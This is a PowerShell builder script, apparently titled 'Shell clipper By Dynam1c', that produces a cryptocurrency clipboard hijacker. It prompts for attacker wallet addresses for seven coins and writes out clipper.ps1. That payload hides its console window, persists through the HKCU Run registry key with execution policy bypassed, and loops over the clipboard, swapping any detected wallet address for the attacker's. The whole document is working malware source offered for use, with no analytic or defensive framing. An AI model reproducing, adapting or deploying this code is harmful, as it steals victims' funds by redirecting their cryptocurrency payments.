$host.UI.RawUI.BackgroundColor = 'Black'
$host.UI.RawUI.ForegroundColor = 'DarkGreen'

$L = @"
 ____  _          _ _        _ _                       
/ ___|| |__   ___| | |   ___| (_)_ __  _ __   ___ _ __ 
\___ \| '_ \ / _ \ | |  / __| | | '_ \| '_ \ / _ \ '__|
 ___) | | | |  __/ | | | (__| | | |_) | |_) |  __/ |   
|____/|_| |_|\___|_|_|  \___|_|_| .__/| .__/ \___|_|   
                                                   
                                                   
By Dynam1c                                            


"@
Write-Host $L
$BTC = Read-Host "BTC address" 
$ETH = Read-Host "ETH address" 
$LTC = Read-Host "LTC address" 
$TRX = Read-Host "TRX address" 
$BCH = Read-Host "BCH address" 
$NEO = Read-Host "NEO address"
$XRP = Read-Host "XRP address"  


$addy = @{
    "BTC" = $BTC
    "ETH" = $ETH
    "LTC" = $LTC
    "TRX" = $TRX
    "BCH" = $BCH
    "NEO" = $NEO
    "XRP" = $XRP
}


$script = @"
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
public static void Hide()
{
    IntPtr hWnd = GetConsoleWindow();
    if(hWnd != IntPtr.Zero)
    {
        ShowWindow(hWnd, 0);
    }
}
'
[Console.Window]::Hide()

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
public static void Hide()
{
    IntPtr hWnd = GetConsoleWindow();
    if(hWnd != IntPtr.Zero)
    {
        ShowWindow(hWnd, 0);
    }
}
'
[Console.Window]::Hide()

$scriptPath = (Get-ChildItem -Path $env:USERPROFILE -Recurse -Include "clipper.ps1" -File -ErrorAction SilentlyContinue).FullName

$regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

if ((Get-ItemProperty -Path $regPath -Name "clipper" -ErrorAction SilentlyContinue) -eq $null) {
    New-ItemProperty -Path $regPath -Name "clipper" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force | Out-Null
}

`$addy = @{
    "BTC" = "$($addy['BTC'])"
    "ETH" = "$($addy['ETH'])"
    "LTC" = "$($addy['LTC'])"
    "TRX" = "$($addy['TRX'])"
    "BCH" = "$($addy['BCH'])"
    "NEO" = "$($addy['NEO'])"
    "XRP" = "$($addy['XRP'])"
}
while (`$true) {
    `$clipper = Get-Clipboard
    if (`$clipper -match "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$") {
        `$clipper = `$addy["BTC"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    }
    elseif (`$clipper -match "^0x[a-fA-F0-9]{40}$") {
        `$clipper = `$addy["ETH"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    }
    elseif (`$clipper -match "ltc1([qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39})") {
        `$clipper = `$addy["LTC"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    }
    elseif (`$clipper -match "((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}") {
        `$clipper = `$addy["BCH"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
    } 
     
     elseif (`$clipper -match "(?:^A[0-9a-zA-Z]{33}$)") {
        `$clipper = `$addy["NEO"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
  
    }

    elseif (`$clipper -match "(?:^r[0-9a-zA-Z]{24,34}$)") {
        `$clipper = `$addy["XRP"]
        [System.Windows.Forms.Clipboard]::SetText(`$clipper)
  
    }
    
    Start-Sleep -Seconds 0
}
"@

$path = (New-Object -ComObject "Shell.Application").BrowseForFolder(0, "Folder to save clipper.ps1", 0, "C:\").Self.Path + "\clipper.ps1"
$script | Out-File -FilePath $path